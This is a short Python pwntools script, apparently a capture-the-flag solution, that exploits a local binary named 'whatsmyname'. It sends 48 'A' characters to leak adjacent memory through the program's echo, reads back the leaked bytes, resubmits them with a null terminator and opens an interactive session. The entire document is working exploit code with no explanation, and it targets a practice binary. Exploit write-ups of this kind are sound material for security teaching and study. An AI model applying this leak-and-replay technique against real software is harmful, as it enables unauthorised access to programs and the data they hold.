from pwn import *

context.terminal=["konsole", "-e"]
context.log_level="debug"

p = process("./whatsmyname")

p.sendline("A"*48)
p.recvuntil("A"*48)

x = p.recvline()[:-2] + "\x00"

p.sendline(x)

p.interactive()
